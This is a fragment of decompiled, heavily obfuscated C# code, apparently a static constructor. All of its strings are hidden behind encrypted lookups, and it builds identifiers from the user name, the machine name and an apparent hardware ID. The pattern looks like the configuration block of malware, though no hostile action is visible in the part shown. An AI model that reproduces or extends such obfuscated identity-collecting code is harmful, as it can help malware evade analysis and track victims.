			KfBmpaPpRy(getString_0(107413126)),
			KfBmpaPpRy(getString_0(107413605)),
			KfBmpaPpRy(getString_0(107413564)),
			KfBmpaPpRy(getString_0(107413491)),
			KfBmpaPpRy(getString_0(107381409)),
			KfBmpaPpRy(getString_0(107413482)),
			KfBmpaPpRy(getString_0(107381844)),
			KfBmpaPpRy(getString_0(107413449)),
			KfBmpaPpRy(getString_0(107413416)),
			KfBmpaPpRy(getString_0(107413375)),
			KfBmpaPpRy(getString_0(107412830)),
			KfBmpaPpRy(getString_0(107412757)),
			KfBmpaPpRy(getString_0(107412716)),
			KfBmpaPpRy(getString_0(107412715)),
			KfBmpaPpRy(getString_0(107412682)),
			KfBmpaPpRy(getString_0(107412641)),
			KfBmpaPpRy(getString_0(107413080)),
			KfBmpaPpRy(getString_0(107413039))
		};
		PLOLJYWeMWGpM = new List<string>
		{
			KfBmpaPpRy(oskmnSWYALtpc(getString_0(107413030))),
			KfBmpaPpRy(getString_0(107412949)),
			KfBmpaPpRy(getString_0(107412856)),
			KfBmpaPpRy(getString_0(107412247)),
			KfBmpaPpRy(getString_0(107412154)),
			KfBmpaPpRy(getString_0(107412569)),
			KfBmpaPpRy(getString_0(107412508)),
			KfBmpaPpRy(getString_0(107412379)),
			KfBmpaPpRy(getString_0(107411806)),
			KfBmpaPpRy(getString_0(107411709)),
			KfBmpaPpRy(getString_0(107411616)),
			KfBmpaPpRy(getString_0(107412031)),
			KfBmpaPpRy(getString_0(107411938)),
			KfBmpaPpRy(oskmnSWYALtpc(getString_0(107413030)))
		};
		JrEMVbiIdsnWGMh = KfBmpaPpRy(getString_0(107411841));
		TvdQhUAZHUpp = new List<string>
		{
			KfBmpaPpRy(getString_0(107411184)),
			KfBmpaPpRy(getString_0(107411502)),
			KfBmpaPpRy(getString_0(107411308)),
			KfBmpaPpRy(getString_0(107410634)),
			KfBmpaPpRy(getString_0(107410952)),
			KfBmpaPpRy(getString_0(107410246))
		};
		jQsJEYgqnYfva = new List<string>
		{
			KfBmpaPpRy(getString_0(107410052)),
			KfBmpaPpRy(getString_0(107410503)),
			KfBmpaPpRy(getString_0(107410442))
		};
		OBiTPypEPPSaLg = getString_0(107396770);
		IFKuwcmSLwPIPe = getString_0(107396770);
		NqbcwORJHgk = new DateTime(2000, 1, 1);
		fHNlylXjhwtg = new DateTime(2100, 1, 1);
		JXFCxCiyhWYLpp = getString_0(107396765);
		raHMniyIxZuJCC = getString_0(107392302);
		xRGLBhsaFcrKl = getString_0(107396770);
		rGsrRKpAHJNl = getString_0(107396770);
		mkVfwfeWFJpck = getString_0(107396770);
		EjtjxbjTqgmD = getString_0(107396770);
		WHGgQTjRlvqky = getString_0(107396770);
		rfxQznDDZcfw = getString_0(107396770);
		hVXoeTbUUaWy = new List<string>
		{
			getString_0(107395780),
			getString_0(107396006),
			getString_0(107395814),
			getString_0(107395343)
		};
		nPOfuoWjdBEJXWdYO = getString_0(107396770);
		YPZutdATMurXqcQ = getString_0(107410349);
		XrJhJtkEBjIoJZ = getString_0(107396770);
		VJtZoDtDriMd = getString_0(107396770);
		AeXPwayjsZCdzeV = getString_0(107396770);
		NDMXRGcShGOYi = string.Empty;
		loMcYZKWQQXGC = getString_0(107396770);
		JedayuyjYQv = getString_0(107396770);
		tUDzwIURvHClJE = getString_0(107396770);
		xLWNYJMVcE = getString_0(107395092);
		rIobnorOVTwoPh = getString_0(107395092);
		cqEXBgzhEbOYvf = getString_0(107396770);
		ezghwjRSrPj = getString_0(107396770);
		LhfSrEuWtmc = getString_0(107396770);
		tXlRkfKutDq = getString_0(107396770);
		TWTJTObvOmNzyB = getString_0(107396770);
		PmxsRzjJGPB = getString_0(107410376);
		QuwbVcHirWQ = getString_0(107396770);
		ORjgfofRMlyF = getString_0(107396770);
		IYcsuWjlOhpGqM = getString_0(107410327);
		TvQOhOYJDM = getString_0(107396770);
		vnKLbNPAXvMkPFb = getString_0(107396770);
		MVwpVRBXTVLjeLfX = getString_0(107396770);
		qCziuZEVIKv = getString_0(107396770);
		KyyvCOSpbyrlwCK = getString_0(107410338);
		FETefEWvHBDgcTp = getString_0(107396765);
		uGBVVDwnISiPvpGvAv = getString_0(107396770);
		NwLNnKNwbdzsgfZ = getString_0(107396770);
		tttsZxnASxs = getString_0(107396770);
		lgYFuyThGznQIqR = new string[0];
		VvpOdAIUVnqJzW = getString_0(107396770);
		eccKoyYfSl = true;
		rtXtlgTZIsNjmPPy = getString_0(107396770);
		RoDeoCKBnUdhS = false;
		chtCsBAqNWxo = false;
		muPYedySMPaN = false;
		jptlurBjWWVRD = false;
		nzrzeINFdi = getString_0(107410293);
		zObGGMIceXoVAZ = false;
		kTLQhcVwfMsI = false;
		qsRYEskGecBwsdJu = false;
		ZqCAqHfWvbFF = false;
		TOGjrVUqPLyQO = true;
		ORtBYtWybnrW = getString_0(107410304) + Environment.UserName + getString_0(107409747) + Environment.MachineName + getString_0(107409758) + OtanrfhnzOcptTQBO.ZmCQYDHnCyhy() + getString_0(107409721);
		CsUrzcuJHIDFF = false;
		avGGySyKJADi = new Stopwatch();
		ZKtLKJvwOV = 0;
		ECVrzbpNTQco = 0;
		xPtaINcBZjHD = false;
		tvMzMsATBRq = getString_0(107409712) + OtanrfhnzOcptTQBO.ZmCQYDHnCyhy() + getString_0(107409735);
	}
}
